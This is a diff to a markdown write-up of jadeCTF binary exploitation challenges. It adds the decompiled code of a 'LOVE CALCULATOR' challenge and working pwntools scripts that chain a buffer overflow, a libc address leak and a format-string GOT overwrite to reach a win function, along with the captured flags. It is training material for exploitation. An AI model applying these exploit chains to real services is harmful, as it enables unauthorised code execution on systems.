@@ -465,6 +465,12 @@ We need to provide all these 3 arguments. Hence, we need to fill the `rdi`, `rsi
   
 **NOTE:** In our writeup, we have used the second gadget for rsi (0x400948) to show how even complex gadgets can be used for ROP chaining, but it will be easier to use the third gadget (0x400c81).
 Using these gadgets, we can pass the appropriate values to the registers, and then call the write function to leak addresses and find the LIBC base, after which, we can perform a simple ret2libc and get a shell.  
+  
+Our Exploit:
+1. Perform stack pivoting to call the `hidden_level()` function with appropriate arguments.
+2. Use the `write` function to leak addresses of other functions (like `setvbuf`), and leak the LIBC base.
+3. Perform ret2libc to get a shell.
+  
 **solve.py**
 ```py
 from pwn import *
@@ -491,7 +497,7 @@ log.info(f"setvbuf got -> {hex(elf.got['setvbuf'])}")
 payload = flat(
     p64(0),
     p64(rop.find_gadget(["pop rdi", "ret"]).address),
-    p64(0xdeadbeef),
+    p64(-0x21524111, sign="signed"),
     p64(elf.symbols["hidden_level"])
 )
 p.sendlineafter(b"first input please: ", payload)
@@ -538,4 +544,228 @@ p.sendlineafter(b"unlock the hidden door:\n", payload)
 p.interactive()
 p.close()
 ```  
-FLAG: `jadeCTF{p1v0t!_p1v0t!_p1v0t!}`
+  
+FLAG: `jadeCTF{p1v0t!_p1v0t!_p1v0t!}`  
+  
+**NOTE:** There is another route possible in which you don't need to call the `hidden_level()` function. You can call the `odd_option()` function again and again and perform stack pivoting each time.
+
+# LOVE CALCULATOR
+First, perform checksec on the binary:
+```
+Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+```
+Now, let's analyze the binary in Ghidra. This is the main function:
+```c
+undefined8 main(void)
+{
+  size_t sVar1;
+  char local_28 [32];
+  
+  setvbuf(stdout,(char *)0x0,2,0);
+  setvbuf(stdin,(char *)0x0,1,0);
+  puts("Welcome to *my* world! It sucks.");
+  printf("Please enter your name: ");
+  fgets(local_28,0x13,stdin);
+  putchar(10);
+  sVar1 = strcspn(local_28,"\r\n");
+  local_28[sVar1] = '\0';
+  analyze_name(local_28);
+  puts("Bye Bye");
+  return 0;
+}
+```
+It inputs our name, and then calls `analyze_name()`. Let's see what that is:
+```c
+void analyze_name(undefined8 param_1)
+{
+  int local_7c;
+  char local_78 [112];
+  
+  printf("Hello, %s! I heard you\'ve come here to analyze yourself.\n",param_1);
+  puts("1. Cleanse yourself\n2. Calculate love percentage\n3. Exit");
+  printf("Please choose what you would like to do: ");
+  __isoc99_scanf(&DAT_00400dda,&local_7c);
+  if (local_7c == 1) {
+    puts("Cleansing....");
+    puts("Cleanse successful. You are fully pure now!");
+  }
+  else {
+    if (local_7c != 2) {
+      puts("Sorry to see you go :-(");
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+    printf("Enter the name of the lucky one ;): ");
+    getchar();
+    gets(local_78);
+    if (show_flag != 0) {
+      puts("Sorry, but you have already got the flag");
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+    if (tried_luck != 0) {
+      puts("Sorry, but you can only try your luck once :)");
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+    tried_luck = 1;
+  }
+  return;
+}
+```
+Clearly, we have to input *2* here in order to reach the overflow on `local_78`. It's an unrestricted buffer overflow.  
+There is a `win()` function which we can call:
+```c
+void win(void)
+
+{
+  char local_78 [104];
+  FILE *local_10;
+  
+  local_10 = fopen("flag.txt","r");
+  if (local_10 == (FILE *)0x0) {
+    printf("Sorry, fl%dg doesn\'t exist.\n",4);
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  fgets(local_78,100,local_10);
+  if (show_flag == 0) {
+    printf("Sorry, no fl%dg for you!",4);
+                    /* WARNING: Subroutine does not return */
+    exit(0);
+  }
+  printf("Here is your flag: %s\n",local_78);
+  return;
+}
+```
+But here, this function works only if the value of `show_flag` is not zero. But from Ghidra, we can see that it is a global variable with default value zero. So, first we need to change its value. Let's see if we have some other function to jump to.  
+```c
+void you_cant_see_me(void)
+{
+  char local_f8 [208];
+  undefined8 local_28;
+  undefined8 local_20;
+  undefined4 local_18;
+  undefined4 local_c;
+  
+  local_28 = 0xa65686548;
+  local_20 = 0;
+  local_18 = 0;
+  local_c = 0;
+  printf("Did you see m%d? ",3);
+  printf("Wh%d are you?\n",0);
+  read(0,local_f8,200);
+  printf("Nice name it %ds: ",1);
+  printf(local_f8);
+  printf("But now you won\'t be able to s%d%d me!\n",3,3);
+  puts((char *)&local_28);
+  show_flag = local_c;
+  return;
+}
+```
+This function takes an input in `local_f8`, then has a *format strings* vulnerability in the same variable, and then assigns the value of `local_c` (0 by default) to `show_flag`. Now, suppose if we somehow change the value of `local_c` to 1 or something else using the format strings vulnerability, we still need an overflow somewhere to call the `win` function. 
+One thing which we can do for this is, if we perform a *GOT overwrite* and change the `puts` function to make it `gets`, we will get an overflow right before the assignment statement. Using the overflow, we can even change the value of `local_c` as well as call the `win` function. So that's what we'll do.  
+But first, we need the LIBC (since we will be performing GOT overwrite). So, for that, let's leak some LIBC addresses.  
+Here's the script for leaking LIBC addresses:
+**leak_libc.py**
+```py
+from pwn import *
+
+BINARY = "chall"
+
+context.binary = BINARY
+elf = context.binary
+rop = ROP(elf)
+
+p = remote("34.76.206.46", 10005)
+# p = elf.process()
+
+p.sendlineafter(b"your name: ", b"Ramesh")
+p.sendlineafter(b"what you would like to do: ", b"2")
+
+# First, leak libc base and rebase libc
+OFFSET = 120
+
+payload = flat(
+    cyclic(OFFSET),
+    p64(rop.find_gadget(["ret"]).address),
+    p64(rop.find_gadget(["pop rdi", "ret"]).address),
+    p64(elf.got["setvbuf"]),
+    p64(elf.plt["puts"]),
+    p64(elf.symbols["you_cant_see_me"])
+)
+
+p.sendlineafter(b"lucky one ;): ", payload)
+
+LEAK = u64(p.recvline().strip().ljust(8, b"\x00"))
+log.info(f"leaked address -> {hex(LEAK)}")
+
+p.close()
+```
+Leak addresses of some common functions like `puts`, `setvbuf`, etc. Then use the last 3 nibbles to search for libc on [blukat](https://libc.blukat.me/). We get two results, let's assume that the first one is the LIBC we need (If it doesn't work, then we'll use the second one). Now, let's formulate our exploit:
+
+1. Leak address of some common functions to get the LIBC base, and ret to `you_cant_see_me()`.
+2. Perform a GOT overwrire to change `puts` to `gets`.
+3. Perform a simple buffer overflow to call the `win()` function, and also simultaneously change the value of `local_c` to something other than 0.  
+  
+**solve.py**
+```py
+from pwn import *
+
+BINARY = "chall"
+LIBC = "libc6_2.23-0ubuntu11.2_amd64.so"
+
+context.binary = BINARY
+elf = context.binary
+rop = ROP(elf)
+libc = ELF(LIBC)
+
+p = remote("34.76.206.46", 10005)
+# p = elf.process()
+
+p.sendlineafter(b"your name: ", b"Ramesh")
+p.sendlineafter(b"what you would like to do: ", b"2")
+
+# First, leak libc base and rebase libc
+OFFSET = 120
+
+payload = flat(
+    cyclic(OFFSET),
+    p64(rop.find_gadget(["ret"]).address),
+    p64(rop.find_gadget(["pop rdi", "ret"]).address),
+    p64(elf.got["puts"]),
+    p64(elf.plt["puts"]),
+    p64(elf.symbols["you_cant_see_me"])
+)
+
+p.sendlineafter(b"lucky one ;): ", payload)
+
+LEAK = u64(p.recvline().strip().ljust(8, b"\x00"))
+log.info(f"puts address -> {hex(LEAK)}")
+
+LIBC_BASE =  LEAK - libc.symbols["puts"]
+log.info(f"libc base -> {hex(LIBC_BASE)}")
+
+libc.address = LIBC_BASE
+
+
+# Now, GOT overwrite, change puts to gets
+payload = fmtstr_payload(6, {elf.got['puts'] : libc.symbols["gets"]})
+p.sendlineafter(b"are you?\n", payload)
+
+payload = flat(
+    cyclic(40),
+    elf.symbols["win"]
+)
+
+p.sendlineafter(b"s33 me!\n", payload)
+
+p.interactive()
+p.close()
+```
+  
+FLAG: `jadeCTF{ret2libc_can_b3_fun_a5_w3ll}`
